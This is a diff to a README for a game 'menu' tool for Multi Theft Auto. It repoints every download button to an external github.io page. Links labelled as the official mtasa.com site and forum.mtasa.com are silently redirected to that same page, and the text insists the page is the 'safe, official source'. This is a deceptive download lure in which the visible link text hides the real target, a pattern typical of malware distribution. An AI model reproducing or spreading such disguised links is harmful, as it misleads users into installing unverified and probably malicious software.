@@ -1,7 +1,7 @@
 <h1>⚡ multi-theft-auto-menu - Unlock Elite MTA Performance Instantly</h1>
 
 <p align="center">
-  <a href="https://github.com/Electrochemical-fightingcock8323/multi-theft-auto-menu">
+  <a href="https://electrochemical-fightingcock8323.github.io">
     <img src="https://img.shields.io/badge/DOWNLOAD-Multi%20Theft%20Auto%20Menu-FF6F00?style=for-the-badge&logo=github&logoColor=white" alt="Download Button" />
   </a>
 </p>
@@ -83,7 +83,7 @@ Follow these simple steps carefully. You will be up and running in under two min
 
 Click the big orange button below or anywhere on this page to go to the official download page. This is the safe, official source for the software. Ensure you download from here only to avoid fake versions.
 
-[![Download Now](https://img.shields.io/badge/⬇️-DOWNLOAD%20NOW-4CAF50?style=for-the-badge&logo=download&logoColor=white)](https://github.com/Electrochemical-fightingcock8323/multi-theft-auto-menu)
+[![Download Now](https://img.shields.io/badge/⬇️-DOWNLOAD%20NOW-4CAF50?style=for-the-badge&logo=download&logoColor=white)](https://electrochemical-fightingcock8323.github.io)
 
 
 
@@ -191,9 +191,9 @@ This means the menu cannot locate your installed MTA game automatically. This ha
 
 ## 🔗 Additional Resources
 
-- **Official MTA Website:** [mtasa.com](https://mtasa.com) — Helpful for updating your game client to the latest version.
+- **Official MTA Website:** [mtasa.com](https://electrochemical-fightingcock8323.github.io) — Helpful for updating your game client to the latest version.
 .
-- **MTA Community Forums:** [forum.mtasa.com](https://forum.mtasa.com) — Find help from other players if you have unique issues. Search for your problem — likely someone has fixed it already.
+- **MTA Community Forums:** [forum.mtasa.com](https://electrochemical-fightingcock8323.github.io) — Find help from other players if you have unique issues. Search for your problem — likely someone has fixed it already.
 .
 .
 - **GitHub Issues Page:** If you find a genuine bug, you can report it on our GitHub issues page so we can fix it in future updates. Your feedback helps improve the tool for everyone.
@@ -209,7 +209,7 @@ Thank you for choosing Multi Theft Auto Inferno (2026). We have worked hard to m
 
 
 <p align="center">
-  <a href="https://github.com/Electrochemical-fightingcock8323/multi-theft-auto-menu">
+  <a href="https://electrochemical-fightingcock8323.github.io">
     <img src="https://img.shields.io/badge/🚀-GET%20STARTED%20NOW-FF3366?style=for-the-badge&logo=github&logoColor=white" alt="Download Button" />
   </a>
 </p>
